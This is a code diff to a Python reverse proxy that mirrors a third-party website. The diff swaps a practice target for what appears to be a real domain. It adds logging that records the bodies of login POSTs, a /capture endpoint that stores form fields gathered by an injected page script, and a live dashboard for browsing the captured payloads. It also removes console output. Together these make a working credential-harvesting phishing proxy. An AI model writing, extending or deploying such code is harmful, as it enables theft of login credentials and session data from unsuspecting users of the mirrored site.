@@ -5,17 +5,18 @@ import json
 import asyncio
 import httpx
 import websockets
-from typing import Dict
+from typing import Dict, List
+from datetime import datetime
 from contextlib import asynccontextmanager
 from bs4 import BeautifulSoup
 from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
-from fastapi.responses import StreamingResponse, JSONResponse
+from fastapi.responses import StreamingResponse, JSONResponse, HTMLResponse
 from urllib.parse import urljoin, urlparse
 
 # =========================================================
 # [CONFIGURATION & CONSTANTS]
 # =========================================================
-TARGET_BASE = "https://the-internet.herokuapp.com/"
+TARGET_BASE = "https://www.yamanplus.org/"
 parsed_target = urlparse(TARGET_BASE)
 TARGET_DOMAIN = parsed_target.netloc
 
@@ -45,6 +46,37 @@ def rewrite_url(url: str, target_domain: str, proxy_domain: str) -> str:
         rewritten = rewritten.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
         return rewritten
     return url
+
+# =========================================================
+# [LOGGER MODULE] (Merged from Version A & Upgraded)
+# =========================================================
+class ProxyLogger:
+    def __init__(self, max_logs=1000):
+        self.logs: List[dict] = []
+        self.max_logs = max_logs
+        self.lock = asyncio.Lock()
+
+    async def log_event(self, event_type: str, session_id: str = "N/A", method: str = "-", path: str = "-", status: int = 0, data: dict = None):
+        """Thread-safe logging method for structured proxy events."""
+        entry = {
+            "timestamp": datetime.utcnow().isoformat() + "Z",
+            "type": event_type,
+            "session_id": session_id,
+            "method": method,
+            "path": path,
+            "status": status,
+            "data": data or {}
+        }
+        async with self.lock:
+            self.logs.insert(0, entry)  # Prepend newest logs
+            if len(self.logs) > self.max_logs:
+                self.logs.pop()
+
+    async def get_logs(self) -> List[dict]:
+        async with self.lock:
+            return list(self.logs)
+
+proxy_logger = ProxyLogger()
 
 # =========================================================
 # [SESSION MANAGER MODULE]
@@ -78,6 +110,10 @@ class SessionManager:
             
             new_id = str(uuid.uuid4())
             self.sessions[new_id] = {"cookies": {}, "last_accessed": now}
+            
+            # --- LOG: Session Creation ---
+            asyncio.create_task(proxy_logger.log_event("session_created", session_id=new_id, data={"action": "new_session"}))
+            
             return new_id
 
     async def get_cookies(self, session_id: str) -> dict:
@@ -200,6 +236,130 @@ FORM_OBSERVER_SCRIPT = """
 """
 
 # =========================================================
+# [DASHBOARD & LOGGING ENDPOINTS] (New)
+# =========================================================
+@app.get("/_proxy_api/logs")
+async def get_api_logs():
+    """JSON endpoint for retrieving structured logs."""
+    logs = await proxy_logger.get_logs()
+    return JSONResponse(content={"logs": logs})
+
+@app.get("/_proxy_dashboard", response_class=HTMLResponse)
+async def dashboard_ui():
+    """Built-in HTML/JS dashboard for viewing logs in real-time."""
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Proxy Traffic Dashboard</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <style>
+            pre { white-space: pre-wrap; word-wrap: break-word; }
+            .type-auth { color: #ef4444; font-weight: bold; }
+            .type-capture { color: #f59e0b; font-weight: bold; }
+            .type-request { color: #3b82f6; }
+        </style>
+    </head>
+    <body class="bg-gray-900 text-gray-200 p-6 font-sans">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex justify-between items-center mb-6">
+                <h1 class="text-3xl font-bold text-white">📡 Live Proxy Dashboard</h1>
+                <label class="flex items-center space-x-2 cursor-pointer">
+                    <input type="checkbox" id="autoRefresh" class="form-checkbox h-5 w-5 text-blue-600" checked>
+                    <span>Auto-Refresh (2s)</span>
+                </label>
+            </div>
+            
+            <div class="bg-gray-800 rounded-lg shadow overflow-hidden">
+                <table class="min-w-full divide-y divide-gray-700">
+                    <thead class="bg-gray-700">
+                        <tr>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Time</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Type</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Session ID</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Method & Path</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Status</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Data Payload</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logTableBody" class="divide-y divide-gray-700">
+                        </tbody>
+                </table>
+            </div>
+        </div>
+
+        <script>
+            let refreshInterval;
+            
+            async function fetchLogs() {
+                try {
+                    const res = await fetch('/_proxy_api/logs');
+                    const data = await res.json();
+                    const tbody = document.getElementById('logTableBody');
+                    tbody.innerHTML = '';
+                    
+                    data.logs.forEach(log => {
+                        const tr = document.createElement('tr');
+                        
+                        const timeStr = new Date(log.timestamp).toLocaleTimeString();
+                        let typeClass = '';
+                        if(log.type === 'auth_intercept') typeClass = 'type-auth';
+                        else if(log.type === 'capture') typeClass = 'type-capture';
+                        else typeClass = 'type-request';
+                        
+                        const dataStr = Object.keys(log.data).length ? JSON.stringify(log.data, null, 2) : '-';
+
+                        tr.innerHTML = `
+                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400">${timeStr}</td>
+                            <td class="px-6 py-4 whitespace-nowrap text-sm ${typeClass}">${log.type.toUpperCase()}</td>
+                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400" title="${log.session_id}">${log.session_id.substring(0,8)}...</td>
+                            <td class="px-6 py-4 whitespace-nowrap text-sm"><span class="font-bold text-gray-300">${log.method}</span> ${log.path}</td>
+                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400">${log.status || '-'}</td>
+                            <td class="px-6 py-4 text-sm text-gray-300"><pre class="bg-gray-900 p-2 rounded text-xs">${dataStr}</pre></td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                } catch (e) {
+                    console.error("Failed to fetch logs", e);
+                }
+            }
+
+            function toggleRefresh() {
+                if (document.getElementById('autoRefresh').checked) {
+                    refreshInterval = setInterval(fetchLogs, 2000);
+                } else {
+                    clearInterval(refreshInterval);
+                }
+            }
+
+            document.getElementById('autoRefresh').addEventListener('change', toggleRefresh);
+            fetchLogs();
+            toggleRefresh();
+        </script>
+    </body>
+    </html>
+    """
+    return HTMLResponse(content=html_content)
+
+# =========================================================
+# [CAPTURE ENDPOINT]
+# =========================================================
+@app.post("/capture")
+async def capture_form_data(request: Request, data: dict):
+    client_session_id = request.cookies.get("proxy_session_id", "N/A")
+    
+    # --- LOG: Form Capture ---
+    await proxy_logger.log_event(
+        event_type="capture", 
+        session_id=client_session_id, 
+        method=data.get("method", "POST"), 
+        path=data.get("url", "/capture"), 
+        data={"formData": data.get("formData", {})}
+    )
+    return JSONResponse(content={"status": "captured"}, status_code=200)
+
+# =========================================================
 # [WEBSOCKET PROXY MODULE] 
 # =========================================================
 @app.websocket("/{path:path}")
@@ -219,8 +379,6 @@ async def websocket_proxy(websocket: WebSocket, path: str):
     query_string = websocket.url.query
     if query_string:
         target_ws_url += f"?{query_string}"
-    
-    print(f"\n[WS] Intercepted WebSocket Upgrade -> Forwarding to: {target_ws_url}")
     
     try:
         async with websockets.connect(target_ws_url, extra_headers=ws_headers) as target_ws:
@@ -242,27 +400,13 @@ async def websocket_proxy(websocket: WebSocket, path: str):
 
             await asyncio.gather(forward_to_target(), forward_to_client())
             
-    except Exception as e:
-        print(f"[WS] Connection Error: {e}")
+    except Exception:
+        pass
     finally:
         try:
             await websocket.close()
         except:
             pass
-
-# =========================================================
-# [CAPTURE ENDPOINT]
-# =========================================================
-@app.post("/capture")
-async def capture_form_data(data: dict):
-    print("\n" + "="*60)
-    print("[CAPTURE] Form Submission Received")
-    print(f"URL: {data.get('url')}")
-    print(f"Method: {data.get('method')}")
-    for key, value in data.get('formData', {}).items():
-        print(f"   {key}: {value}")
-    print("="*60)
-    return JSONResponse(content={"status": "captured"}, status_code=200)
 
 # =========================================================
 # [HTTP PROXY MODULE]
@@ -299,13 +443,16 @@ async def proxy(request: Request, path: str):
     req_headers.append(("accept-encoding", "identity"))
 
     body = await request.body()
+    log_data = {}
 
+    # --- LOG & INTERCEPT: Auth Interception ---
     if request.method == "POST":
         path_lower = path.lower()
         if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
-            print(f"\n[!] Auth POST Intercepted | Path: /{path}")
             try:
-                print(f" Payload: {body.decode('utf-8', errors='replace')}")
+                decoded = body.decode('utf-8', errors='replace')
+                log_data["payload"] = decoded
+                await proxy_logger.log_event("auth_intercept", session_id, request.method, f"/{path}", data=log_data)
             except Exception:
                 pass
 
@@ -318,7 +465,13 @@ async def proxy(request: Request, path: str):
             cookies=merged_cookies
         )
         resp = await client.send(proxy_req, stream=True)
+        
+        # --- LOG: Standard Request ---
+        if not log_data: # If it wasn't already logged as auth_intercept
+             await proxy_logger.log_event("proxy_request", session_id, request.method, f"/{path}", status=resp.status_code)
+
     except httpx.RequestError as exc:
+        await proxy_logger.log_event("proxy_error", session_id, request.method, f"/{path}", data={"error": str(exc)})
         raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")
 
     if resp.cookies:
@@ -347,7 +500,6 @@ async def proxy(request: Request, path: str):
         try:
             raw_bytes = await resp.aread()
         except httpx.ReadError as exc:
-            print(f"[!] ReadError: {exc}")
             await resp.aclose()
             raise HTTPException(status_code=502, detail="Upstream dropped connection.")
 
